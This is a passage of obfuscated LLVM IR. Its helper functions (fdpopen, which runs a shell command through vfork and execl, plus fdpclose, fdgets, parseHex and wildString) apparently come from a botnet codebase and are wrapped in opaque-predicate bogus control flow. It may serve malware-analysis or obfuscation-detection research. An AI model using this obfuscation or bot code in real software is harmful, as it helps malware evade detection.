  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart225, label %originalBB6alteredBB

originalBBpart225:                                ; preds = %originalBB6
  br i1 %86, label %95, label %112

; <label>:95:                                     ; preds = %originalBBpart225
  %96 = load i32, i32* @x.19
  %97 = load i32, i32* @y.20
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %95
  store i32 -1, i32* %11, align 4
  %104 = load i32, i32* @x.19
  %105 = load i32, i32* @y.20
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %285

; <label>:112:                                    ; preds = %originalBBpart225
  %113 = load i32, i32* @x.19
  %114 = load i32, i32* @y.20
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %112
  %121 = load i32*, i32** @fdopen_pids, align 8
  %122 = bitcast i32* %121 to i8*
  %123 = load i32, i32* %16, align 4
  %124 = sext i32 %123 to i64
  %125 = mul i64 %124, 4
  call void @llvm.memset.p0i8.i64(i8* %122, i8 0, i64 %125, i32 1, i1 false)
  %126 = load i32, i32* @x.19
  %127 = load i32, i32* @y.20
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart237, label %originalBB31alteredBB

originalBBpart237:                                ; preds = %originalBB31
  br label %134

; <label>:134:                                    ; preds = %originalBBpart237, %47
  %135 = call i32 @vfork() #11
  store i32 %135, i32* %17, align 4
  switch i32 %135, label %213 [
    i32 -1, label %136
    i32 0, label %143
  ]

; <label>:136:                                    ; preds = %134
  %137 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %138 = load i32, i32* %137, align 4
  %139 = call i32 @close(i32 %138)
  %140 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %141 = load i32, i32* %140, align 4
  %142 = call i32 @close(i32 %141)
  store i32 -1, i32* %11, align 4
  br label %285

; <label>:143:                                    ; preds = %134
  %144 = load i8*, i8** %13, align 8
  %145 = load i8, i8* %144, align 1
  %146 = zext i8 %145 to i32
  %147 = icmp eq i32 %146, 114
  br i1 %147, label %148, label %195

; <label>:148:                                    ; preds = %143
  %149 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %150 = load i32, i32* %149, align 4
  %151 = icmp ne i32 %150, 1
  br i1 %151, label %152, label %175

; <label>:152:                                    ; preds = %148
  %153 = load i32, i32* @x.19
  %154 = load i32, i32* @y.20
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %152
  %161 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %162 = load i32, i32* %161, align 4
  %163 = call i32 @dup2(i32 %162, i32 1) #2
  %164 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %165 = load i32, i32* %164, align 4
  %166 = call i32 @close(i32 %165)
  %167 = load i32, i32* @x.19
  %168 = load i32, i32* @y.20
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  br label %175

; <label>:175:                                    ; preds = %originalBBpart241, %148
  %176 = load i32, i32* @x.19
  %177 = load i32, i32* @y.20
  %178 = sub i32 %176, 1
  %179 = mul i32 %176, %178
  %180 = urem i32 %179, 2
  %181 = icmp eq i32 %180, 0
  %182 = icmp slt i32 %177, 10
  %183 = or i1 %181, %182
  br i1 %183, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %175
  %184 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %185 = load i32, i32* %184, align 4
  %186 = call i32 @close(i32 %185)
  %187 = load i32, i32* @x.19
  %188 = load i32, i32* @y.20
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %210

; <label>:195:                                    ; preds = %143
  %196 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %197 = load i32, i32* %196, align 4
  %198 = icmp ne i32 %197, 0
  br i1 %198, label %199, label %206

; <label>:199:                                    ; preds = %195
  %200 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %201 = load i32, i32* %200, align 4
  %202 = call i32 @dup2(i32 %201, i32 0) #2
  %203 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %204 = load i32, i32* %203, align 4
  %205 = call i32 @close(i32 %204)
  br label %206

; <label>:206:                                    ; preds = %199, %195
  %207 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %208 = load i32, i32* %207, align 4
  %209 = call i32 @close(i32 %208)
  br label %210

; <label>:210:                                    ; preds = %206, %originalBBpart245
  %211 = load i8*, i8** %12, align 8
  %212 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.20, i32 0, i32 0), i8* %211, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:213:                                    ; preds = %134
  %214 = load i32, i32* @x.19
  %215 = load i32, i32* @y.20
  %216 = sub i32 %214, 1
  %217 = mul i32 %214, %216
  %218 = urem i32 %217, 2
  %219 = icmp eq i32 %218, 0
  %220 = icmp slt i32 %215, 10
  %221 = or i1 %219, %220
  br i1 %221, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %213
  %222 = load i8*, i8** %13, align 8
  %223 = load i8, i8* %222, align 1
  %224 = zext i8 %223 to i32
  %225 = icmp eq i32 %224, 114
  %226 = load i32, i32* @x.19
  %227 = load i32, i32* @y.20
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br i1 %225, label %234, label %256

; <label>:234:                                    ; preds = %originalBBpart249
  %235 = load i32, i32* @x.19
  %236 = load i32, i32* @y.20
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %234
  %243 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %244 = load i32, i32* %243, align 4
  store i32 %244, i32* %14, align 4
  %245 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %246 = load i32, i32* %245, align 4
  %247 = call i32 @close(i32 %246)
  %248 = load i32, i32* @x.19
  %249 = load i32, i32* @y.20
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br label %278

; <label>:256:                                    ; preds = %originalBBpart249
  %257 = load i32, i32* @x.19
  %258 = load i32, i32* @y.20
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %256
  %265 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %266 = load i32, i32* %265, align 4
  store i32 %266, i32* %14, align 4
  %267 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %268 = load i32, i32* %267, align 4
  %269 = call i32 @close(i32 %268)
  %270 = load i32, i32* @x.19
  %271 = load i32, i32* @y.20
  %272 = sub i32 %270, 1
  %273 = mul i32 %270, %272
  %274 = urem i32 %273, 2
  %275 = icmp eq i32 %274, 0
  %276 = icmp slt i32 %271, 10
  %277 = or i1 %275, %276
  br i1 %277, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br label %278

; <label>:278:                                    ; preds = %originalBBpart257, %originalBBpart253
  %279 = load i32, i32* %17, align 4
  %280 = load i32*, i32** @fdopen_pids, align 8
  %281 = load i32, i32* %14, align 4
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds i32, i32* %280, i64 %282
  store i32 %279, i32* %283, align 4
  %284 = load i32, i32* %14, align 4
  store i32 %284, i32* %11, align 4
  br label %285

; <label>:285:                                    ; preds = %278, %136, %originalBBpart229, %69, %46, %41
  %286 = load i32, i32* %11, align 4
  ret i32 %286

originalBBalteredBB:                              ; preds = %originalBB, %2
  %287 = alloca i32, align 4
  %288 = alloca i8*, align 8
  %289 = alloca i8*, align 8
  %290 = alloca i32, align 4
  %291 = alloca [2 x i32], align 4
  %292 = alloca i32, align 4
  %293 = alloca i32, align 4
  store i8* %0, i8** %288, align 8
  store i8* %1, i8** %289, align 8
  %294 = load i8*, i8** %289, align 8
  %295 = load i8, i8* %294, align 1
  %296 = zext i8 %295 to i32
  %297 = icmp ne i32 %296, 114
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  %298 = call i32 @getdtablesize() #2
  store i32 %298, i32* %16, align 4
  %299 = icmp sle i32 %298, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %70
  %300 = load i32, i32* %16, align 4
  %301 = sext i32 %300 to i64
  %_ = sub i64 %301, 4
  %gen = mul i64 %_, 4
  %_7 = sub i64 0, %301
  %gen8 = add i64 %_7, 4
  %_9 = sub i64 %301, 4
  %gen10 = mul i64 %_9, 4
  %_11 = sub i64 0, %301
  %gen12 = add i64 %_11, 4
  %_13 = sub i64 %301, 4
  %gen14 = mul i64 %_13, 4
  %_15 = sub i64 %301, 4
  %gen16 = mul i64 %_15, 4
  %_17 = shl i64 %301, 4
  %_18 = sub i64 %301, 4
  %gen19 = mul i64 %_18, 4
  %_20 = sub i64 %301, 4
  %gen21 = mul i64 %_20, 4
  %_22 = sub i64 0, %301
  %gen23 = add i64 %_22, 4
  %302 = mul i64 %301, 4
  %303 = trunc i64 %302 to i32
  %304 = zext i32 %303 to i64
  %305 = call noalias i8* @malloc(i64 %304) #2
  %306 = bitcast i8* %305 to i32*
  store i32* %306, i32** @fdopen_pids, align 8
  %307 = icmp eq i32* %306, null
  br label %originalBB6

originalBB27alteredBB:                            ; preds = %originalBB27, %95
  store i32 -1, i32* %11, align 4
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %112
  %308 = load i32*, i32** @fdopen_pids, align 8
  %309 = bitcast i32* %308 to i8*
  %310 = load i32, i32* %16, align 4
  %311 = sext i32 %310 to i64
  %_32 = sub i64 0, %311
  %gen33 = add i64 %_32, 4
  %_34 = sub i64 %311, 4
  %gen35 = mul i64 %_34, 4
  %312 = mul i64 %311, 4
  call void @llvm.memset.p0i8.i64(i8* %309, i8 0, i64 %312, i32 1, i1 false)
  br label %originalBB31

originalBB39alteredBB:                            ; preds = %originalBB39, %152
  %313 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %314 = load i32, i32* %313, align 4
  %315 = call i32 @dup2(i32 %314, i32 1) #2
  %316 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %317 = load i32, i32* %316, align 4
  %318 = call i32 @close(i32 %317)
  br label %originalBB39

originalBB43alteredBB:                            ; preds = %originalBB43, %175
  %319 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %320 = load i32, i32* %319, align 4
  %321 = call i32 @close(i32 %320)
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %213
  %322 = load i8*, i8** %13, align 8
  %323 = load i8, i8* %322, align 1
  %324 = zext i8 %323 to i32
  %325 = icmp eq i32 %324, 114
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %234
  %326 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %327 = load i32, i32* %326, align 4
  store i32 %327, i32* %14, align 4
  %328 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %329 = load i32, i32* %328, align 4
  %330 = call i32 @close(i32 %329)
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %256
  %331 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 1
  %332 = load i32, i32* %331, align 4
  store i32 %332, i32* %14, align 4
  %333 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i64 0, i64 0
  %334 = load i32, i32* %333, align 4
  %335 = call i32 @close(i32 %334)
  br label %originalBB55
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  %11 = icmp eq i32* %10, null
  br i1 %11, label %19, label %12

; <label>:12:                                     ; preds = %1
  %13 = load i32*, i32** @fdopen_pids, align 8
  %14 = load i32, i32* %3, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i32, i32* %13, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %12, %1
  store i32 -1, i32* %2, align 4
  br label %94

; <label>:20:                                     ; preds = %12
  %21 = load i32, i32* %3, align 4
  %22 = call i32 @close(i32 %21)
  %23 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %24 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %25 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %27 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  br label %28

; <label>:28:                                     ; preds = %42, %20
  %29 = load i32*, i32** @fdopen_pids, align 8
  %30 = load i32, i32* %3, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i32, i32* %29, i64 %31
  %33 = load i32, i32* %32, align 4
  %34 = call i32 @waitpid(i32 %33, i32* %7, i32 0)
  store i32 %34, i32* %8, align 4
  br label %35

; <label>:35:                                     ; preds = %28
  %36 = load i32, i32* %8, align 4
  %37 = icmp eq i32 %36, -1
  br i1 %37, label %38, label %42

; <label>:38:                                     ; preds = %35
  %39 = call i32* @__errno_location() #13
  %40 = load i32, i32* %39, align 4
  %41 = icmp eq i32 %40, 4
  br label %42

; <label>:42:                                     ; preds = %38, %35
  %43 = phi i1 [ false, %35 ], [ %41, %38 ]
  br i1 %43, label %28, label %44

; <label>:44:                                     ; preds = %42
  %45 = load i32, i32* @x.21
  %46 = load i32, i32* @y.22
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %54 = load i32*, i32** @fdopen_pids, align 8
  %55 = load i32, i32* %4, align 4
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i32, i32* %54, i64 %56
  store i32 0, i32* %57, align 4
  %58 = load i32, i32* %8, align 4
  %59 = icmp eq i32 %58, -1
  %60 = load i32, i32* @x.21
  %61 = load i32, i32* @y.22
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %59, label %68, label %85

; <label>:68:                                     ; preds = %originalBBpart2
  %69 = load i32, i32* @x.21
  %70 = load i32, i32* @y.22
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %68
  %77 = load i32, i32* @x.21
  %78 = load i32, i32* @y.22
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %92

; <label>:85:                                     ; preds = %originalBBpart2
  %86 = bitcast %struct.in_addr* %9 to i32*
  %87 = load i32, i32* %7, align 4
  store i32 %87, i32* %86, align 4
  %88 = bitcast %struct.in_addr* %9 to i32*
  %89 = load i32, i32* %88, align 4
  %90 = and i32 %89, 65280
  %91 = ashr i32 %90, 8
  br label %92

; <label>:92:                                     ; preds = %85, %originalBBpart24
  %93 = phi i32 [ -1, %originalBBpart24 ], [ %91, %85 ]
  store i32 %93, i32* %2, align 4
  br label %94

; <label>:94:                                     ; preds = %92, %19
  %95 = load i32, i32* %2, align 4
  ret i32 %95

originalBBalteredBB:                              ; preds = %originalBB, %44
  %96 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %97 = load i32*, i32** @fdopen_pids, align 8
  %98 = load i32, i32* %4, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds i32, i32* %97, i64 %99
  store i32 0, i32* %100, align 4
  %101 = load i32, i32* %8, align 4
  %102 = icmp eq i32 %101, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %68
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.23
  %5 = load i32, i32* @y.24
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  store i32 1, i32* %15, align 4
  store i32 0, i32* %16, align 4
  %17 = load i32, i32* @x.23
  %18 = load i32, i32* @y.24
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %43, %originalBBpart2
  %26 = load i32, i32* %15, align 4
  %27 = icmp eq i32 %26, 1
  br i1 %27, label %28, label %41

; <label>:28:                                     ; preds = %25
  %29 = load i32, i32* %16, align 4
  %30 = load i32, i32* %13, align 4
  %31 = icmp slt i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %12, align 8
  %34 = load i32, i32* %16, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = getelementptr inbounds i8, i8* %36, i64 -1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 10
  br label %41

; <label>:41:                                     ; preds = %32, %28, %25
  %42 = phi i1 [ false, %28 ], [ false, %25 ], [ %40, %32 ]
  br i1 %42, label %43, label %53

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %14, align 4
  %45 = load i8*, i8** %12, align 8
  %46 = load i32, i32* %16, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds i8, i8* %45, i64 %47
  %49 = call i64 @read(i32 %44, i8* %48, i64 1)
  %50 = trunc i64 %49 to i32
  store i32 %50, i32* %15, align 4
  %51 = load i32, i32* %16, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %16, align 4
  br label %25

; <label>:53:                                     ; preds = %41
  %54 = load i32, i32* @x.23
  %55 = load i32, i32* @y.24
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %53
  %62 = load i32, i32* %15, align 4
  %63 = icmp eq i32 %62, 0
  %64 = load i32, i32* @x.23
  %65 = load i32, i32* @y.24
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %63, label %72, label %89

; <label>:72:                                     ; preds = %originalBBpart24
  %73 = load i32, i32* @x.23
  %74 = load i32, i32* @y.24
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %72
  %81 = load i32, i32* @x.23
  %82 = load i32, i32* @y.24
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %91

; <label>:89:                                     ; preds = %originalBBpart24
  %90 = load i8*, i8** %12, align 8
  br label %91

; <label>:91:                                     ; preds = %89, %originalBBpart28
  %92 = phi i8* [ null, %originalBBpart28 ], [ %90, %89 ]
  ret i8* %92

originalBBalteredBB:                              ; preds = %originalBB, %3
  %93 = alloca i8*, align 8
  %94 = alloca i32, align 4
  %95 = alloca i32, align 4
  %96 = alloca i32, align 4
  %97 = alloca i32, align 4
  store i8* %0, i8** %93, align 8
  store i32 %1, i32* %94, align 4
  store i32 %2, i32* %95, align 4
  store i32 1, i32* %96, align 4
  store i32 0, i32* %97, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %53
  %98 = load i32, i32* %15, align 4
  %99 = icmp eq i32 %98, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %72
  br label %originalBB6
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = load i32, i32* @x.25
  %3 = load i32, i32* @y.26
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca i64, align 8
  store i8* %0, i8** %10, align 8
  store i64 0, i64* %11, align 8
  %12 = load i32, i32* @x.25
  %13 = load i32, i32* @y.26
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %20

; <label>:20:                                     ; preds = %30, %originalBBpart2
  %21 = load i8*, i8** %10, align 8
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %28

; <label>:25:                                     ; preds = %20
  %26 = load i64, i64* %11, align 8
  %27 = icmp sge i64 %26, 0
  br label %28

; <label>:28:                                     ; preds = %25, %20
  %29 = phi i1 [ false, %20 ], [ %27, %25 ]
  br i1 %29, label %30, label %40

; <label>:30:                                     ; preds = %28
  %31 = load i64, i64* %11, align 8
  %32 = shl i64 %31, 4
  %33 = load i8*, i8** %10, align 8
  %34 = getelementptr inbounds i8, i8* %33, i32 1
  store i8* %34, i8** %10, align 8
  %35 = load i8, i8* %33, align 1
  %36 = zext i8 %35 to i64
  %37 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %36
  %38 = load i64, i64* %37, align 8
  %39 = or i64 %32, %38
  store i64 %39, i64* %11, align 8
  br label %20

; <label>:40:                                     ; preds = %28
  %41 = load i32, i32* @x.25
  %42 = load i32, i32* @y.26
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  %49 = load i64, i64* %11, align 8
  %50 = load i32, i32* @x.25
  %51 = load i32, i32* @y.26
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i64 %49

originalBBalteredBB:                              ; preds = %originalBB, %1
  %58 = alloca i8*, align 8
  %59 = alloca i64, align 8
  store i8* %0, i8** %58, align 8
  store i64 0, i64* %59, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  %60 = load i64, i64* %11, align 8
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %3 = load i32, i32* @x.27
  %4 = load i32, i32* @y.28
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %14 = load i8*, i8** %12, align 8
  %15 = load i8, i8* %14, align 1
  %16 = zext i8 %15 to i32
  %17 = load i32, i32* @x.27
